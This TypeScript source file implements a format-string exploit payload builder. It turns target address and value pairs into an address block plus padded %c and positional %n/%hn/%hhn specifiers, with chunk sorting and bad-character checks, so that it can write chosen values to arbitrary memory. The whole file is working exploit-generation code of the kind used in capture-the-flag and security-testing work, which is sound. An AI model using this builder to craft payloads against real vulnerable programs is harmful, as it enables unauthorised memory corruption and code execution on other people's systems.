// Deterministic format-string write-what-where builder.
// Pure logic (no debugger access) so it is fully unit-testable.

export type FmtWidth = "byte" | "word" | "dword";

export interface FmtWrite {
  addr: number; // 32-bit target address
  value: number; // 32-bit value to write there
}

export interface FmtBuildOptions {
  writes: FmtWrite[];
  argIndex: number; // positional arg index of the first buffer dword (%argIndex$)
  width?: FmtWidth; // write granularity; default "word"
  exclude?: number[]; // badchars — checked against emitted bytes
  prefix?: number; // bytes already printed before the format string begins
}

export interface FmtChunkRow {
  chunk: number; // sequential emission order
  targetAddr: number; // address this %n writes to
  value: number; // chunk value written (masked to width)
  arg: number; // positional argument index used
  cumCount: number; // running printed-byte count at the write
  specifier: string; // the emitted specifier fragment
}

export interface FmtBuildResult {
  addressBlock: number[]; // raw dword bytes laid at the front of the buffer
  addressDwords: number[]; // the target addresses, in slot order
  formatString: string; // the ASCII specifier portion
  payload: number[]; // addressBlock ++ formatString bytes
  rows: FmtChunkRow[];
  warnings: string[];
}

const WIDTHS: Record<FmtWidth, { bytes: number; mask: number; mod: number; spec: string }> = {
  byte: { bytes: 1, mask: 0xff, mod: 0x100, spec: "hhn" },
  word: { bytes: 2, mask: 0xffff, mod: 0x10000, spec: "hn" },
  dword: { bytes: 4, mask: 0xffffffff, mod: 0x100000000, spec: "n" },
};

// Padding above this per-write is almost certainly a mistake (huge payload) —
// surfaced as a warning suggesting a narrower width.
const PAD_WARN_THRESHOLD = 0x10000;

export function parseU32(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value >>> 0;
  }
  if (typeof value === "string") {
    const text = value.trim();
    if (/^0x[0-9a-fA-F]+$/.test(text)) {
      return Number.parseInt(text, 16) >>> 0;
    }
    if (/^[0-9a-fA-F]+$/.test(text) && /[a-fA-F]/.test(text)) {
      return Number.parseInt(text, 16) >>> 0;
    }
    if (/^[0-9]+$/.test(text)) {
      return Number.parseInt(text, 10) >>> 0;
    }
  }
  throw new Error(`Cannot parse "${String(value)}" as a 32-bit value.`);
}

function dwordLE(value: number): number[] {
  return [value & 0xff, (value >>> 8) & 0xff, (value >>> 16) & 0xff, (value >>> 24) & 0xff];
}

interface Entry {
  targetAddr: number;
  chunkVal: number;
}

export function buildFormatString(options: FmtBuildOptions): FmtBuildResult {
  const width = options.width ?? "word";
  const spec = WIDTHS[width];
  const prefix = options.prefix ?? 0;
  const exclude = new Set((options.exclude ?? []).map((b) => b & 0xff));
  const warnings: string[] = [];

  if (!Number.isInteger(options.argIndex) || options.argIndex < 1) {
    throw new Error("argIndex must be a positive integer (the positional %N$ index of the first buffer dword).");
  }
  if (options.writes.length === 0) {
    throw new Error("writes must contain at least one { addr, value } pair.");
  }

  // Explode every write into width-sized chunks (little-endian).
  const chunksPerWrite = 4 / spec.bytes;
  const entries: Entry[] = [];
  for (const write of options.writes) {
    const addr = write.addr >>> 0;
    const value = write.value >>> 0;
    for (let c = 0; c < chunksPerWrite; c += 1) {
      const shift = c * spec.bytes * 8;
      const chunkVal = width === "dword" ? value >>> 0 : (value >>> shift) & spec.mask;
      entries.push({ targetAddr: (addr + c * spec.bytes) >>> 0, chunkVal });
    }
  }

  // Sort ascending by chunk value so %c padding is monotonic (non-negative).
  entries.sort((a, b) => a.chunkVal - b.chunkVal);

  // Address block: one dword slot per chunk, in emission order. The slot at
  // position i is referenced by positional argument (argIndex + i).
  const addressDwords = entries.map((entry) => entry.targetAddr);
  const addressBlock = addressDwords.flatMap(dwordLE);
  const addressBlockLen = addressBlock.length;

  let runningCount = (prefix + addressBlockLen) >>> 0;
  const rows: FmtChunkRow[] = [];
  let formatString = "";

  entries.forEach((entry, i) => {
    const arg = options.argIndex + i;
    const current = runningCount % spec.mod;
    const pad = (entry.chunkVal - current + spec.mod) % spec.mod;

    if (pad > PAD_WARN_THRESHOLD) {
      warnings.push(
        `Chunk ${i} needs ${pad} padding bytes (target 0x${entry.chunkVal.toString(16)}). ` +
          `Consider a narrower width to shrink the payload.`,
      );
    }

    const fragment = (pad > 0 ? `%${pad}c` : "") + `%${arg}$${spec.spec}`;
    formatString += fragment;
    runningCount += pad;

    // Defensive: the low bits of the running count must equal the target chunk.
    const written = runningCount % spec.mod;
    if (written !== entry.chunkVal) {
      throw new Error(`Internal error: chunk ${i} would write 0x${written.toString(16)}, expected 0x${entry.chunkVal.toString(16)}.`);
    }

    rows.push({
      chunk: i,
      targetAddr: entry.targetAddr,
      value: entry.chunkVal,
      arg,
      cumCount: runningCount,
      specifier: fragment,
    });
  });

  // Badchar audit — the address bytes cannot be encoded away.
  for (const write of options.writes) {
    for (const b of dwordLE(write.addr >>> 0)) {
      if (exclude.has(b)) {
        warnings.push(`Target address 0x${(write.addr >>> 0).toString(16).toUpperCase().padStart(8, "0")} contains badchar 0x${b.toString(16).padStart(2, "0")} — cannot be delivered as-is.`);
        break;
      }
    }
  }
  const formatBytes = [...formatString].map((ch) => ch.charCodeAt(0));
  for (const b of formatBytes) {
    if (exclude.has(b)) {
      warnings.push(`Format string contains badchar 0x${b.toString(16).padStart(2, "0")} (character "${String.fromCharCode(b)}").`);
      break;
    }
  }

  return {
    addressBlock,
    addressDwords,
    formatString,
    payload: [...addressBlock, ...formatBytes],
    rows,
    warnings,
  };
}
